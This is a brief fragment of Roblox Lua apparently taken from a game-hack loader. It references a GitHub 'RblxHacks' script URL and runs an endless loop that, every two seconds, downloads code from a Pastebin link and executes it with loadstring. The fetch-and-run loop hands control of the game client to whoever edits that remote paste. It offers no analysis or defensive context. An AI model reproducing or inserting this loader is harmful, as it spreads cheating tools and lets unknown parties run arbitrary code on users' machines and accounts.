...
local universalScript = "https://raw.githubusercontent.com/DRZ1NK/RblxHacks/refs/heads/main/Global.lua"
...
task.spawn(function()
    while true do
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://pastebin.com/raw/tMMn2sHe"))()
        end)
        if not success then warn("Pastebin loop error: " .. err) end
        task.wait(2)
    end
end)
